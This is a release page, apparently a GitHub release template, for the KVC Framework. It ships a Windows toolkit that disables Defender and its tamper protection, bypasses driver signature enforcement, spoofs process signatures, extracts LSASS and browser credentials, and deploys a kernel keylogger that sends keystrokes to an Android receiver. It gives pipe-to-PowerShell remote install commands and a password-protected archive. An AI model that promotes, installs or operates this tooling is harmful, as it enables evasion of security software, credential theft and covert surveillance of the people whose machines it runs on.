## 🔐 PASSWORD: `github.com`
### Extract downloaded release with password: `github.com`

---

## 📦 ARCHIVE CONTENTS (`kvc.7z` — ${SIZE_7Z})

```
kvc-latest/
│
├── kvc.exe              ⭐ Main KVC Framework executable (REQUIRED)  [${SIZE_EXE}]
├── kvc.dat              ⭐ Encrypted PassExtractor module (OPTIONAL)  [${SIZE_DAT}]
│                           Required for: Chrome, Edge, Brave — passwords + cookies
├── README.txt           📄 Installation guide
│
└── other-tools/         🔧 Development & Research Tools (OPTIONAL)
    │
    ├── encoding-tools/  📦 Framework Build Pipeline
    │   ├── implementer.exe  - Steganographic icon builder
    │   ├── KvcXor.exe       - Resource encoder/decoder
    │   ├── kvc.ini          - Icon builder configuration
    │   ├── kvc.sys          - Kernel driver (kvc)
    │   ├── kvcstrm.sys      - Kernel driver (OmniDriver) — PP/PPL process termination
    │   ├── ExplorerFrame​.dll - System DLL (with U+200B hijack char)
    │   ├── kvc_orig.ico     - Original icon template
    │   ├── kvc.ico          - Built steganographic icon
    │   ├── kvc_pass.exe     - Password extractor binary
    │   └── kvc_crypt.dll    - Encryption / injection library
    │
    ├── undervolter/     🔋 EFI Undervolting Module
    │   ├── UnderVolter.dat  - Encrypted EFI payload → deploy with: kvc undervolter deploy
    │   ├── Loader.efi       - UEFI loader (replaces BOOTX64.EFI in mode A)
    │   ├── UnderVolter.efi  - Main EFI application (voltage/power MSR writes)
    │   └── UnderVolter.ini  - Per-CPU profile (Intel 2nd–15th gen, auto-selected by CPUID)
    │
    └── keylogger-kit/   ⌨️ Kernel Keylogger Research Tools
        ├── UdpLogger.apk       - Android UDP receiver (1.47 MB)
        ├── kvckbd.sys          - Keyboard hook driver (14 KB)
        ├── kvckbd.bat          - Automated deployment script
        ├── kvckbd_split.c      - Driver source code (79 KB)
        ├── MainActivity.kt     - Android app source
        └── UdpLoggerService.kt - Android service source
```

---

## 🔗 DOWNLOAD LINKS

| File | Size | Description |
|------|------|-------------|
| [kvc.7z](https://github.com/${REPO}/releases/download/${TAG}/kvc.7z) | ${SIZE_7Z} | Main archive (password: `github.com`) |
| [kvc.enc](https://github.com/${REPO}/releases/download/${TAG}/kvc.enc) | ${SIZE_ENC} | Deployment package (used by `irm` installer) |
| [kvc.dat](https://github.com/${REPO}/releases/download/${TAG}/kvc.dat) | ${SIZE_DAT} | PassExtractor module — Chrome, Edge, Brave (`kvc setup` or auto-download) |
| [kvcforensic.dat](https://github.com/${REPO}/releases/download/${TAG}/kvcforensic.dat) | ${SIZE_FORENSIC} | Forensic module — LSASS minidump credential extraction (`kvc analyze`) |
| [UnderVolter.dat](https://github.com/${REPO}/releases/download/${TAG}/UnderVolter.dat) | ${SIZE_UNDERVOLTER} | EFI undervolting module (`kvc undervolter deploy`) |
| [run](https://github.com/${REPO}/releases/download/${TAG}/run) | — | PowerShell one-command installer |

---

## 🚀 QUICK INSTALLATION

### One-Line Remote Install:
```powershell
irm https://github.com/${REPO}/releases/download/${TAG}/run | iex
```
Downloads `kvc.exe` + `kvc.dat`, runs `kvc setup` automatically.

### Mirror:
```powershell
irm https://kvc.pl/run | iex
```

### Manual:
1. Download `kvc.7z`, extract with password `github.com`
2. Open elevated Command Prompt (Run as Administrator)
3. Run: `kvc setup`

---

## ✅ WHAT'S NEW — ${DATE}

<details>
<summary><strong>[12.04.2026] kvcforensic.dat — LSASS minidump credential extraction via KvcForensic</strong></summary>

New optional module distributed as a separate release asset. Embeds [`KvcForensic.exe`](https://github.com/wesmar/KvcForensic) + `KvcForensic.json` (per-build LSA offset templates), XOR-encrypted with the standard KVC key.

**Validated extraction targets:**

| Windows version | Build range | Status |
|---|---|---|
| Windows 11 26H1 | 28000+ | Full |
| Windows 11 25H2 | 26200–27999 | Full |
| Windows 11 24H2 / Server 2025 | 26100–26199 | Full |
| Windows 10 22H2 | 19045 | Legacy core decrypt |
| Win11 23H2–22H2, Win10 1809–22H2 | 17763–26099 | Legacy path, limited validation |
| Win10 1803 and earlier, 8.x, 7 | below 17763 | Template only / experimental |

Packages: MSV1_0 (NT/LM/SHA1), WDigest (cleartext), Kerberos (sessions + tickets), DPAPI (master keys), CredMan.
TSPKG and Kerberos ticket export (`.kirbi`/`.ccache`) are **in progress / experimental**.
Full supported-builds table and architecture: [github.com/wesmar/KvcForensic](https://github.com/wesmar/KvcForensic)

**Integration with kvc:**

- `kvc analyze <dump>` — run KvcForensic CLI; `--format txt|json|both`, `--full`, `--tickets <dir>`
- `kvc analyze lsass` — auto-locate LSASS dump in CWD then Downloads
- `kvc analyze --gui` — launch KvcForensic GUI
- `kvc setup` deploys `kvcforensic.dat` to System32 if present in CWD (optional)
- If missing at runtime, `kvc analyze` prompts to download from GitHub automatically
- Same auto-download for `kvc.dat`: missing `kvc_pass.exe` → prompt on `kvc bp` / `kvc export secrets`

</details>

<details>
<summary><strong>[10.04.2026] g_CiOptions — fully offline semantic locator (Win10 + Win11 26H1, no PDB)</strong></summary>

- Replaces PDB symbol download and hardcoded offsets with deterministic offline analysis of `ci.dll` — no network, no PDB, no hardcoded RVAs
- **Win11 26H1 fix:** `g_CiOptions` moved from `CiPolicy+0x4` → `+0x8`; previous hardcoded read returned `0x00000000` → null-derived address → BSOD; now probed dynamically
- **Win11 path:** scans executable sections for RIP-relative references into `CiPolicy`; scores by instruction kind diversity, reference count, flags-like use (`test`/`bt`/`bts`); falls back to build-number offset only if probe inconclusive
- **Win10 path:** no `CiPolicy` section — scans `.data` references; handles `0x2E` CS segment override prefix, `CNT_CODE`-only `PAGE` section, register-loaded masks (`mov ebx, 4000h / test [rip+x], ebx`)
- **Qualification gate:** candidate enters final round only if `(DirectHighMasks != 0 OR BitOpsCount >= 2) AND LowBitEvidence != 0` — excludes spinlocks/counters that accumulate large raw scores
- **HVCI detection fix:** `value == 0x0001C000` → `(value & 0x0001C000) != 0`; registry fallback added for configurations where bit state isn't reflected at query time
- **kvcstrm:** one new IOCTL primitive added to the OmniDriver interface

</details>

<details>
<summary><strong>[08.04.2026] kvc_smss — SMSS boot-phase driver loader (C, NATIVE subsystem)</strong></summary>

- Fourth embedded binary — `kvc_smss.exe`; `SUBSYSTEM:NATIVE`, no CRT, pure NT syscalls; executed by SMSS before Win32, before Defender, before any user-mode security stack
- Uses `kvc.sys` from DriverStore (`avc.inf_amd64_*`) as DSE bypass primitive — no new vulnerable driver dropped to disk
- Full DSE bypass cycle per entry: load kvc.sys → resolve ntoskrnl base → patch `SeCiCallbacks+0x20` (CiValidateImageHeader → ZwFlushInstructionCache) → load target driver → restore → unload kvc.sys
- Kernel offsets resolved at install time via PDB (`kvc install <driver>`), written to `C:\Windows\drivers.ini` — zero network at boot
- INI-driven (`drivers.ini`, UTF-16 LE with BOM): `LOAD`, `UNLOAD`, `RENAME`, `DELETE` actions processed in file order
- `RENAME`/`DELETE` operate at NT I/O manager level via `NtSetInformationFile` — before any filesystem filter drivers, no Win32
- HVCI handling: if active, patches SYSTEM hive offline using chunked NK/VK walker (`FILE_OPEN_FOR_BACKUP_INTENT`, 1 MB chunks + 256-byte overlap), schedules reboot via `RebootGuardian`

</details>

<details>
<summary><strong>[06.04.2026] kvcstrm.sys (OmniDriver) — purpose-built kernel primitive driver</strong></summary>

- New kernel driver embedded in the steganographic icon alongside `kvc.sys`; written from scratch as KMDF, not a repurposed CVE payload
- IOCTL interface: cross-process virtual R/W (`MmCopyVirtualMemory`, KernelMode previous-mode), batch R/W (64 ops/round-trip), PP/PPL process termination (`ZwTerminateProcess` kernel handle), `EPROCESS.PS_PROTECTION` direct write, physical memory R/W (`MmMapIoSpaceEx`), kernel pool alloc/free (tracked + spinlock-guarded), CR0.WP-clear write to read-only memory, token elevation to SYSTEM, handle table close
- **`kvc secengine disable`** — no restart: kills Defender processes via ring-0 `ZwTerminateProcess` immediately after setting IFEO block
- **`kvc kill`** — automatic PP/PPL fallback to kvcstrm when standard path returns access denied
- Auto-lifecycle: `EnsureStrmOpen` loads on demand from DriverStore, `CleanupStrm` removes service entry after use — SCM registry stays clean

</details>

<details>
<summary><strong>[04.04.2026] Process Signature Spoofing</strong></summary>

- Spoofs `SignatureLevel` + `SectionSignatureLevel` fields in `EPROCESS`
- `kvc protect` / `kvc set` auto-calculates and applies optimal signature levels (e.g. `0x37`/`0x07` for PPL-Antimalware — indistinguishable from `MsMpEng.exe` under kernel inspection)
- `kvc spoof <PID|name> <ExeSigHex> <DllSigHex>` — manual surgical control; can mimic Kernel/System signatures (`0x1E`/`0x1C`)

</details>

<details>
<summary><strong>[03.04.2026] Security Engine: IFEO block replaces RpcSs dependency hijack</strong></summary>

- `secengine disable` uses IFEO `Debugger=systray.exe` on `MsMpEng.exe` — loader intercept before any Defender code runs
- DACL bypass via offline hive cycle: `RegSaveKeyEx` → `RegLoadKey` → write → `RegUnLoadKey` → `RegRestoreKey(REG_FORCE_RESTORE)`
- `secengine status` reports three independent dimensions: IFEO Debugger presence, WinDefend service state (`RUNNING`/`STOPPED`), MsMpEng process presence
- Restart-free as of [06.04.2026] via kvcstrm ring-0 kill

</details>

<details>
<summary><strong>[03.2026] Browser extraction, kvc.dat, UnderVolter, DSE bypass, driver management + more</strong></summary>

- **Browser extraction without closing** — kills only network-service subprocess; Edge gets a second kill timed before Cookies DB open (~1–2 s vs ~3–5 s for Chrome)
- **COM Elevation for Edge** — `IEdgeElevatorFinal` (`{1FCBE96C-1697-43AF-9140-2897C7C69767}`) for all data types; DPAPI as fallback only; split-key strategy removed
- **kvc.dat** — single encrypted package for `kvc_pass.exe` + `kvc_crypt.dll`; auto-deployed by `kvc setup`
- **Legacy CPU / Static CRT** — no AVX/YMM instructions; `/MT` — no `vcruntime140.dll` dependency
- **UnderVolter** — EFI undervolting; patches CFG Lock + OC Lock in `Setup` NVRAM variable (IFR offset); Intel 2nd–15th gen (Sandy Bridge → Arrow Lake); ESP located by GPT GUID, no `mountvol`; `kvc undervolter deploy/remove/status`
- **Next-Gen DSE bypass** — `SeCiCallbacks`/`ZwFlushInstructionCache` redirection; PatchGuard-safe; Secure Boot compatible (HVCI off)
- **`kvc driver load/reload/stop/remove`** — unsigned driver management with auto-DSE bypass/restore; `-s 0–4` start type
- **`kvc modules <proc>`** — loaded modules in any process incl. PPL-protected; `read <module> [offset] [size]` for raw bytes (default 256 B, max 4096 B)
- **Defender exclusions via WMI** — `MSFT_MpPreference` COM direct; no PowerShell; idempotent per-value check before every write
- **Auto self-exclusion** — silent process + path exclusion on every invocation (including `kvc help`)
- **`kvc rtp` / `kvc tp`** — Real-Time Protection and Tamper Protection toggle via `IUIAutomation` ghost mode (no PowerShell, no WMI — literal UI automation)
- **`kvc list --gui`** — graphical process list
- **Full hive coverage** — backup/restore/defrag on all 8 hives: `SYSTEM`, `SOFTWARE`, `SAM`, `SECURITY`, `DEFAULT`, `BCD`, `NTUSER.DAT`, `UsrClass.dat`
- **Tetris** — `kvc tetris`; x64 assembly; Win32 GUI; PPL-WinTcb; high scores in registry

</details>

---

## 📋 AUTOMATIC SETUP PROCESS (`kvc setup`)

1. Moves `kvc.exe` to `C:\Windows\System32`
2. Adds Windows Defender exclusions automatically
3. Extracts kernel driver from steganographic icon resource
4. Deploys PassExtractor if `kvc.dat` is present:
   - Decrypts and splits `kvc.dat` → `kvc_pass.exe` + `kvc_crypt.dll`
   - Writes both to `C:\Windows\System32`
5. Deploys Forensic module if `kvcforensic.dat` is present in CWD (optional):
   - Writes `kvcforensic.dat` to `C:\Windows\System32`
   - Enables `kvc analyze` commands
6. Full browser extraction (Chrome, Edge, Brave) available immediately

---

## 📞 CONTACT & SUPPORT

- **Email**: marek@wesolowski.eu.org
- **Website**: https://kvc.pl
- **GitHub**: https://github.com/wesmar/kvc

---

*Release Date: ${DATE}*
*© WESMAR 2026*
